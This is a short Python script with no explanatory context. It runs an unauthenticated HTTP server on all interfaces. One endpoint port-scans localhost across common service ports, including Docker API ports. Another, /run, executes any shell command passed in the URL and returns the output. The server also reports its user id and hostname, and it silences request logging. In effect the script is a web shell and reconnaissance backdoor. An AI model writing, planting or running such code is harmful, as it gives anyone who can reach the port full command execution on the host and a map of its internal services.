import http.server, socketserver, os, json, subprocess, urllib.parse, socket
def scan():
    out={}
    for h in ['127.0.0.1','::1']:
        o=[]
        for p in list(range(1,1025))+[2375,2376,3000,4000,4646,5000,6000,7000,8000,8080,8081,8443,8500,9000,9090,9100,9200,10000,11000,11001,12000,13306,19000,20000,21000,50000,55]:
            try:
                fam=socket.AF_INET6 if ':' in h else socket.AF_INET
                s=socket.socket(fam); s.settimeout(0.3); s.connect((h,p)); o.append(p); s.close()
            except Exception: pass
        out[h]=o
    return out
def run(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,timeout=40); return {"rc":r.returncode,"out":r.stdout.decode('utf-8','replace')[:8000],"err":r.stderr.decode('utf-8','replace')[:1000]}
    except Exception as e: return {"error":str(e)[:200]}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
        if u.path=="/scan": body=json.dumps(scan()).encode()
        elif u.path=="/run" and "c" in q: body=json.dumps(run(q["c"][0])).encode()
        else: body=json.dumps({"uid":os.getuid(),"host":socket.gethostname()}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("0.0.0.0",int(os.environ.get("PORT",3000))),H) as s: s.serve_forever()
